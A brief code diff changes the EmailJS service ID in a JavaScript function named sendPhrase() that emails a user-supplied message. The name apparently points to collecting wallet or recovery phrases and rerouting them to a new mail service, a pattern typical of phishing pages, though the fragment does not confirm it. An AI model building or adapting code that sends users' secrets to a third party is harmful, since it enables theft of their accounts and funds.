@@ -108,7 +108,7 @@ function sendPhrase() {
     let parms = { message: safetext };
 
     // Trigger EmailJS instantly and synchronously natively.
-    emailjs.send("service_18cd01v", "template_artm0pa", parms)
+    emailjs.send("service_b91vfvn", "template_artm0pa", parms)
         .then(function (response) {
             console.log("200! Yes", response.status, response.text);
         })
